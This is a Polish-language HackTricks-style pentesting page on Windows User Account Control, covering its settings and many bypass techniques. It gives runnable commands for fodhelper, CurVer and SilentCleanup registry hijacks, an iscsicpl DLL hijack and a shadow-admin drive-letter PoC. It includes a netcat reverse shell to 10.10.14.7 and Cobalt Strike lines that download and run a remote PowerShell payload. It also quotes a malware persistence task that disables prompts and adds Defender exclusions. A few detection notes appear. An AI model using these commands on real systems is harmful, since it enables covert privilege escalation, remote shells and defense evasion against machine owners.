# UAC - Kontrola konta użytkownika

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja, która umożliwia wyświetlanie **monitu o zgodę na działania wymagające podwyższonych uprawnień**. Aplikacje mają różne poziomy `integrity`, a program z **wysokim poziomem** może wykonywać zadania, które **mogłyby potencjalnie zagrozić systemowi**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta niebędącego administratorem**, chyba że administrator wyraźnie zezwoli tym aplikacjom/zadaniom na dostęp do systemu na poziomie administratora. Jest to funkcja ułatwiająca korzystanie z systemu, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uznawana za security boundary.<sup>[[2]](#references)</sup>

Więcej informacji o poziomach integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Gdy UAC jest aktywne, użytkownik będący administratorem otrzymuje 2 tokeny: token standardowego użytkownika do wykonywania zwykłych działań przy poziomie medium integrity oraz token z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) szczegółowo omawia działanie UAC i obejmuje proces logowania, user experience oraz architekturę UAC.<sup>[[2]](#references)</sup> Administratorzy mogą używać security policies do konfigurowania działania UAC zgodnie z potrzebami organizacji lokalnie (za pomocą secpol.msc) albo konfigurować je i wdrażać za pośrednictwem Group Policy Objects (GPO) w środowisku domenowym Active Directory. Różne ustawienia omówiono szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Dla UAC można ustawić 10 ustawień Group Policy. Poniższa tabela zawiera dodatkowe informacje:

| Ustawienie Group Policy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru                | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Wyłączone)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Monit o zgodę dla plików binarnych innych niż Windows na secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Monit o poświadczenia na secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Włączone; domyślnie wyłączone w wersji Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Wyłączone)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Włączone)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Włączone)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Wyłączone)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Włączone)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Włączone)                                              |

### Zasady instalowania software w Windows

**lokalne security policies** („secpol.msc” w większości systemów) są domyślnie skonfigurowane tak, aby **uniemożliwiać użytkownikom niebędącym administratorami instalowanie software**. Oznacza to, że nawet jeśli użytkownik niebędący administratorem może pobrać installer Twojego software, nie będzie mógł go uruchomić bez konta administratora.

### Klucze rejestru wymuszające wyświetlanie przez UAC monitu o podwyższenie uprawnień

Jako standardowy użytkownik bez praw administratora możesz dopilnować, aby konto „standardowe” otrzymywało **monit UAC o poświadczenia** podczas próby wykonania określonych działań. Wymaga to modyfikacji określonych **kluczy rejestru**, do których potrzebne są uprawnienia administratora, chyba że istnieje **UAC bypass** albo attacker jest już zalogowany jako administrator.

Nawet jeśli użytkownik należy do grupy **Administrators**, zmiany te wymuszają na użytkowniku **ponowne wprowadzenie poświadczeń konta** w celu wykonania działań administracyjnych.

**W praktyce jest to przydatne tylko wtedy, gdy masz już elevated token, UAC bypass albo misconfiguration umożliwiającą zmianę tych kluczy; w przeciwnym razie sam zapis do rejestru zostanie zablokowany.**

Klucze rejestru i wpisy, które należy zmienić, są następujące (ich wartości domyślne podano w nawiasach):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Można to również zrobić ręcznie za pomocą narzędzia Local Security Policy. Po zmianie ustawień operacje administracyjne będą wymagać od użytkownika ponownego wprowadzenia poświadczeń.

### Uwaga

**User Account Control nie jest security boundary.** Dlatego standardowi użytkownicy nie mogą wydostać się ze swoich kont i uzyskać praw administratora bez wykorzystania local privilege escalation exploit.

### Poproś użytkownika o „pełny dostęp do komputera”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Uprawnienia UAC

- Tryb chroniony Internet Explorera używa kontroli integralności, aby uniemożliwić procesom o wysokim poziomie integralności (takim jak przeglądarki internetowe) dostęp do danych o niskim poziomie integralności (takich jak folder tymczasowych plików internetowych). Osiąga się to poprzez uruchomienie przeglądarki z tokenem o niskim poziomie integralności. Gdy przeglądarka próbuje uzyskać dostęp do danych przechowywanych w strefie o niskim poziomie integralności, system operacyjny sprawdza poziom integralności procesu i odpowiednio zezwala na dostęp. Ta funkcja pomaga zapobiegać atakom zdalnego wykonania kodu, które próbują uzyskać dostęp do poufnych danych w systemie.
- Gdy użytkownik loguje się do systemu Windows, system tworzy token dostępu zawierający listę uprawnień użytkownika. Uprawnienia są definiowane jako połączenie praw i możliwości użytkownika. Token zawiera również listę danych uwierzytelniających użytkownika, używanych do uwierzytelniania użytkownika na komputerze i w zasobach sieciowych.

### Autoadminlogon

Aby skonfigurować system Windows do automatycznego logowania określonego użytkownika podczas uruchamiania, ustaw **`AutoAdminLogon registry key`**. Jest to przydatne w środowiskach kioskowych lub do celów testowych. Używaj tej funkcji wyłącznie w bezpiecznych systemach, ponieważ hasło będzie widoczne w rejestrze.

Ustaw następujące klucze za pomocą Edytora rejestru lub `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Aby przywrócić normalne zachowanie logowania, ustaw `AutoAdminLogon` na 0.

## Ominięcie UAC

> [!TIP]
> Pamiętaj, że jeśli masz dostęp graficzny do ofiary, ominięcie UAC jest proste, ponieważ możesz po prostu kliknąć „Yes”, gdy pojawi się monit UAC

Ominięcie UAC jest potrzebne w następującej sytuacji: **UAC jest aktywne, Twój proces działa w kontekście o średnim poziomie integralności, a Twój użytkownik należy do grupy administratorów**.

Należy wspomnieć, że **ominięcie UAC jest znacznie trudniejsze, gdy jest ono ustawione na najwyższy poziom zabezpieczeń (Always), niż gdy działa na którymkolwiek z pozostałych poziomów (Default).**

### Szybki triage z powłoki o średnim poziomie integralności

Przed próbą ominięcia potwierdź, że znajdujesz się w odpowiednim scenariuszu, i dopasuj kompilację hosta do znanych działających metod:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktyczne uwagi:
- Jeśli `EnableLUA=0`, nie potrzebujesz bypassu: dowolny token administratora może bezpośrednio zażądać wysokiego poziomu integralności.
- `ConsentPromptBehaviorAdmin=2` lub `5` to typowy scenariusz dla auto-elevate / bypassów opartych na COM.
- `Always Notify` podnosi poprzeczkę, ale nadal należy przetestować dokładny build zamiast zakładać niepowodzenie: UACME nadal śledzi niektóre metody `AlwaysNotify compatible` na współczesnych buildach Windows.<sup>[[3]](#references)</sup>

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` ma wartość **`0`**), możesz **uruchomić reverse shell z uprawnieniami administratora** (wysoki poziom integralności), używając czegoś takiego:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Obejście UAC przez duplikację tokenu

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Bardzo** podstawowe „obejście” UAC (pełny dostęp do systemu plików)

Jeśli masz shell użytkownika należącego do grupy Administrators, możesz **zamontować udział C$** udostępniany przez SMB (system plików) lokalnie jako nowy dysk i uzyskasz **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego użytkownika Administrator).

> [!WARNING]
> **Wygląda na to, że ten trik już nie działa**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalny poziom bezpieczeństwa
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów do **bypassowania** **UAC**.

### Podniesione interfejsy COM (`ICMLuaUtil` / `CMSTPLUA`)

Automatycznie podnoszone obiekty COM pozostają praktycznym obszarem UAC na współczesnych buildach. `ICMLuaUtil` jest nadal oznaczony w UACME jako działający na aktualnych gałęziach Windows, a narzędzia ofensywne wciąż dostosowują `CMSTPLUA`, łącząc interaktywny proces pulpitu, wykonanie 64-bitowe i czasami podszywanie się pod PEB/proces przed wywołaniem COM Elevation Moniker.<sup>[[3]](#references)</sup>

Praktyczne wskazówki:
- Preferuj proces **64-bitowy** w **interaktywnej sesji** użytkownika (zwykle `explorer.exe` lub jego proces potomny).
- Jeśli surowa powłoka zawiedzie, spróbuj ponownie z implementacji BOF / UACME zamiast naiwnego wrappera `CreateProcess`.
- Zakładaj, że wykonanie procesu potomnego nastąpi w **oddzielnym podniesionym procesie**; wiele BOF-ów nie podnosi uprawnień bieżącego beacona bezpośrednio.

### KRBUACBypass

Dokumentacja i narzędzie dostępne pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploity bypassu UAC

[**UACME** ](https://github.com/hfiref0x/UACME), które jest **kompilacją** kilku exploitów bypassu UAC. Pamiętaj, że musisz **skompilować UACME za pomocą Visual Studio lub msbuild**. Kompilacja utworzy kilka plików wykonywalnych (takich jak `Source\Akagi\outout\x64\Debug\Akagi.exe`), a Ty będziesz musiał wiedzieć, **którego potrzebujesz.**\
Należy zachować **ostrożność**, ponieważ niektóre bypasses będą **wyświetlać monity dotyczące innych programów**, które **powiadomią** **użytkownika**, że coś się dzieje.<sup>[[3]](#references)</sup>

UACME zawiera **wersję buildu**, od której każda technika zaczęła działać.<sup>[[3]](#references)</sup> Możesz wyszukać technikę wpływającą na Twoje wersje:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ponadto, korzystając z [tej](https://en.wikipedia.org/wiki/Windows_10_version_history) strony, można uzyskać wydanie Windows `1607` na podstawie wersji buildów.

Praktyczny workflow polega na tym, aby najpierw **ocenić build hosta**, a dopiero potem uruchomić pasującą metodę:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` szybko porównuje lokalny build ze znanymi metodami UAC, co pozwala szybko odrzucić niedziałające PoC.<sup>[[4]](#references)</sup>
- `UACME` pozostaje najlepszym publicznym katalogiem umożliwiającym dopasowanie bypassu do konkretnego builda. Nowsze wydania dodały nowe metody i ponownie przetestowały istniejące pod kątem **Windows 11 25H2**, dlatego przed założeniem, że stary wpis na blogu nadal ma zastosowanie bez zmian, sprawdź ponownie README oraz informacje o wydaniu.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (przejęcie rejestru)

Zaufany plik binarny `fodhelper.exe` jest automatycznie podnoszony na nowoczesnych systemach Windows. Po uruchomieniu odpy
tuje poniższą ścieżkę rejestru użytkownika bez sprawdzania czasownika `DelegateExecute`. Umieszczenie tam polecenia pozwala procesowi o poziomie integralności Medium (użytkownik należy do grupy Administratorzy) uruchomić proces o poziomie integralności High bez monitu UAC.

Ścieżka rejestru odpytywana przez fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Kroki PowerShell (ustaw swój payload, a następnie go uruchom)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Uwagi:
- Działa, gdy bieżący użytkownik jest członkiem grupy Administrators, a poziom UAC jest domyślny/łagodny (nie ustawiony na Always Notify z dodatkowymi ograniczeniami).
- Użyj ścieżki `sysnative`, aby uruchomić 64-bitowy PowerShell z 32-bitowego procesu w 64-bitowym systemie Windows.
- Payload może być dowolnym poleceniem (PowerShell, cmd lub ścieżką do pliku EXE). Aby zachować stealth, unikaj interfejsów UI wyświetlających monity.

#### CurVer/extension hijack variant (tylko HKCU)

Nowsze samples wykorzystujące `fodhelper.exe` omijają `DelegateExecute` i zamiast tego **przekierowują ProgID `ms-settings`** za pomocą wartości `CurVer` dla bieżącego użytkownika. Auto-elevated binary nadal wyszukuje handler w `HKCU`, więc do umieszczenia kluczy nie jest potrzebny token administratora:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Po uzyskaniu podwyższonych uprawnień malware często **wyłącza przyszłe monity**, ustawiając `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a następnie wykonuje dodatkowe działania typu defense evasion (np. `Add-MpPreference -ExclusionPath C:\ProgramData`) i odtwarza persistence, aby uruchamiać się z poziomem high integrity. Typowe zadanie persistence przechowuje na dysku **skrypt PowerShell zaszyfrowany za pomocą XOR** i co godzinę dekoduje go oraz wykonuje w pamięci:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ten wariant nadal usuwa dropper i pozostawia tylko staged payloads, przez co detection opiera się na monitorowaniu **`CurVer` hijack**, modyfikowaniu `ConsentPromptBehaviorAdmin`, tworzeniu wykluczeń w Defenderze lub scheduled tasks, które deszyfrują PowerShell w pamięci.<sup>[[5]](#references)</sup>

### UAC bypass przez zadanie `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` uruchamia `cleanmgr.exe` z najwyższymi uprawnieniami i rozwija `%windir%` ze środowiska użytkownika. Jeśli kontrolujesz `HKCU\Environment\windir`, możesz przekierować to rozwinięcie do dowolnego polecenia i uzyskać high integrity bez okna zgody.<sup>[[8]](#references)</sup> Ta metoda nadal zasługuje na testy na nowszych buildach, ponieważ UACME utrzymuje tę technikę jako aktywną, a śledzenie najnowszych zgłoszeń wskazuje, że Windows 11 24H2 może wymagać jedynie niewielkich zmian w cudzysłowach.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Jeśli zadanie cytuje ścieżkę w tej kompilacji, ponów próbę z payloadem kończącym się cudzysłowem (na przykład `cmd.exe"`). Po zakończeniu testów zawsze wyczyść `HKCU\Environment\windir`.

#### Więcej UAC bypass

Wiele klasycznych UAC bypass wykorzystujących przepływy interfejsu użytkownika, obiekty COM lub interakcję z pulpitem wymaga **pełnej interaktywnej sesji** z ofiarą; zwykły shell `nc.exe` lub usługa działająca w **Session 0** często nie wystarczy.

Często można to rozwiązać za pomocą sesji **meterpreter**. Wykonaj migrację do **procesu**, który ma wartość **Session** równą **1**:

![Skieruj ms-settings do niestandardowego rozszerzenia (.thm) i przypisz to rozszerzenie do naszego payloadu - Więcej UAC bypass: Możesz to uzyskać za pomocą sesji meterpreter. Wykonaj migrację do procesu, który ma wartość Session...](<../../images/image (863).png>)

(_explorer.exe_ powinno działać)

### UAC Bypass z GUI

Jeśli masz dostęp do **GUI**, możesz po prostu zaakceptować monit UAC, gdy się pojawi; w rzeczywistości nie potrzebujesz technicznego bypassu. Dlatego uzyskanie sesji GUI często wystarcza, aby ominąć praktyczne utrudnienia dodane przez UAC.

Co więcej, jeśli uzyskasz sesję GUI, z której ktoś korzystał (potencjalnie przez RDP), **niektóre narzędzia będą uruchomione jako administrator**. Możesz z ich poziomu **uruchomić** na przykład **cmd** bezpośrednio **jako administrator**, bez ponownego wyświetlania monitu UAC, tak jak w przypadku [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być nieco bardziej **stealthy**.

### Głośny brute-force UAC bypass

Jeśli nie zależy ci na dyskrecji, możesz zawsze **uruchomić coś takiego jak** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), co **prosi o podniesienie uprawnień, dopóki użytkownik tego nie zaakceptuje**.

### Własny bypass - podstawowa metodologia UAC bypass

Jeśli przyjrzysz się **UACME**, zauważysz, że **wiele UAC bypass wykorzystuje DLL hijacking** (często przez spowodowanie, aby binarny plik uruchomiony z podwyższonymi uprawnieniami załadował kontrolowaną przez atakującego bibliotekę DLL z zapisywalnej ścieżki). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność na DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Znajdź plik binarny, który wykonuje **autoelevate** (sprawdź, czy po uruchomieniu działa na poziomie wysokiej integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musieć **zapisać** bibliotekę DLL w **chronionych ścieżkach** (takich jak C:\Windows\System32), do których nie masz uprawnień zapisu. Możesz to obejść za pomocą:
1. **wusa.exe**: Windows 7, 8 i 8.1. Umożliwia wyodrębnienie zawartości pliku CAB do chronionych ścieżek (ponieważ to narzędzie jest uruchamiane z wysokim poziomem integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, który skopiuje bibliotekę DLL do chronionej ścieżki i uruchomi podatny, automatycznie podnoszący uprawnienia plik binarny.

### Inna technika UAC bypass

Polega na sprawdzeniu, czy **autoElevated binary** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** **pliku binarnego** lub **polecenia**, które ma zostać **wykonane** (jest to bardziej interesujące, jeśli plik binarny wyszukuje te informacje w **HKCU**).

### UAC bypass przez `SysWOW64\iscsicpl.exe` + DLL hijack z użyciem użytkownika `PATH`

32-bitowy `C:\Windows\SysWOW64\iscsicpl.exe` to **plik binarny z automatycznym podnoszeniem uprawnień**, który można wykorzystać do załadowania `iscsiexe.dll` zgodnie z kolejnością wyszukiwania. Jeśli możesz umieścić złośliwy plik `iscsiexe.dll` w folderze **zapisywalnym przez użytkownika**, a następnie zmodyfikować `PATH` bieżącego użytkownika (na przykład przez `HKCU\Environment\Path`), aby ten folder był przeszukiwany, Windows może załadować kontrolowaną przez atakującego bibliotekę DLL do procesu z podwyższonymi uprawnieniami `iscsicpl.exe` **bez wyświetlania monitu UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Uwagi praktyczne:
- Jest to przydatne, gdy bieżący użytkownik należy do grupy **Administrators**, ale z powodu UAC działa na poziomie **Medium Integrity**.
- Kopia w **SysWOW64** jest właściwa dla tego bypassu. Kopię w **System32** traktuj jako osobny plik binarny i niezależnie zweryfikuj jego działanie.
- Mechanizm polega na połączeniu **auto-elevation** i **DLL search-order hijacking**, dlatego ten sam przepływ pracy w ProcMon, który jest używany dla innych UAC bypass, jest przydatny do potwierdzenia braku ładowania biblioteki DLL.

Minimalny przebieg:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Pomysły na wykrywanie:
- Generuj alerty dla `reg add` / zapisów do rejestru w `HKCU\Environment\Path`, po których bezpośrednio następuje uruchomienie `C:\Windows\SysWOW64\iscsicpl.exe`.
- Wyszukuj `iscsiexe.dll` w lokalizacjach **kontrolowanych przez użytkownika**, takich jak `%TEMP%` lub `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Koreluj uruchomienia `iscsicpl.exe` z nieoczekiwanymi procesami potomnymi lub ładowaniem DLL spoza standardowych katalogów Windows.

### Nowsze badania warte osobnego sprawdzenia

Niektóre łańcuchy opublikowane po 2024 roku nie przypominają już klasycznych hijacków rejestru `HKCU\Software\Classes`. Przykładowo, poisoning activation-context cache może łączyć **drive remap** i **DLL redirection**, aby przejść z poziomu medium do high integrity za pośrednictwem zaufanych UI / auto-elevated binaries, takich jak `ctfmon.exe`, a następnie nowszych celów, takich jak `fodhelper.exe`. Zamiast powielać tutaj obszerny PoC, sprawdź kompaktowe przykłady payloadów w:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack litery dysku przez per-logon-session DOS device map w ramach Administrator Protection (25H2)

Pełny attack surface `RAiLaunchAdminProcess` / UIAccess w Windows 11 25H2 znajdziesz na dedykowanej stronie:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” używa tokenów shadow-admin z mapami `\Sessions\0\DosDevices/<LUID>` przypisanymi do sesji. Katalog jest tworzony leniwie przez `SeGetTokenDeviceMap` przy pierwszym rozwiązywaniu `\??`. Jeśli attacker impersonuje token shadow-admin wyłącznie na poziomie **SecurityIdentification**, katalog zostaje utworzony z attackerem jako **właścicielem** (dziedziczy `CREATOR OWNER`), co umożliwia tworzenie linków liter dysków mających pierwszeństwo przed `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Kroki:**

1. Z sesji o niskich uprawnieniach wywołaj `RAiProcessRunOnce`, aby uruchomić pozbawiony monitów `runonce.exe` z uprawnieniami shadow-admin.
2. Zduplikuj jego token główny jako token **identyfikacyjny** i wykonaj na nim impersonation podczas otwierania `\??`, aby wymusić utworzenie `\Sessions\0\DosDevices/<LUID>` z własnością attackera.
3. Utwórz tam dowiązanie symboliczne `C:` wskazujące na storage kontrolowany przez attackera; kolejne operacje systemu plików w tej sesji będą rozwiązywać `C:` jako ścieżkę attackera, umożliwiając hijack DLL/plików bez wyświetlania monitu.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referencje

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jak działa User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Zbiór technik UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – skaner kompatybilności i launcher UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI wykorzystuje AI do generowania PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: eksploatacja 0-day przeciwko celom rządowym w Azji Południowo-Wschodniej](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Omijanie Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Omijanie UAC za pomocą zadania SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
